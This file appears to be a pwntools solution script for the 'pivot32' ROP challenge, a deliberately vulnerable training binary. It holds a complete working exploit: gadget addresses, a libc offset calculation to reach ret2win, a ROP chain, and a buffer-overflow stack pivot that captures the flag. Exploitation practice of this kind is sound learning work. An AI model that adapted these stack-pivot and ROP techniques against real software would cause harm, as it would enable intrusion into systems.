from pwn import *

libc = ELF('./libpivot32.so')

# Gadgets section
popebx = 0x08048571
popeax = 0x80488c0
xchg = 0x80488c2
mov = 0x80488c4
add = 0x80488c7
foothold_function_call = 0x80485f0
foothold_function_plt = 0x804a024
call_eax = 0x080486a3

libc_foothold_function = libc.symbols['foothold_function']
libc_ret2win  = libc.symbols['ret2win']
offset = -libc_foothold_function + libc_ret2win

p = process('./pivot32')
p.recvuntil(': ')
pivot = p.recv(1024)[:10]
pivot = int(pivot[2:], 16)

exploit = ''
exploit += p32(foothold_function_call)
exploit += p32(popeax)
exploit += p32(foothold_function_plt)
exploit += p32(mov)
exploit += p32(popebx)
exploit += p32(offset)
exploit += p32(add)
exploit += p32(call_eax)
p.sendline(exploit)

#Stack smash
exploit = ''
exploit += 'A'*44
exploit += p32(popeax)
exploit += p32(pivot)
exploit += p32(xchg)
p.recvuntil('>')
p.sendline(exploit)

p.recvuntil('so')
print p.recvuntil('}')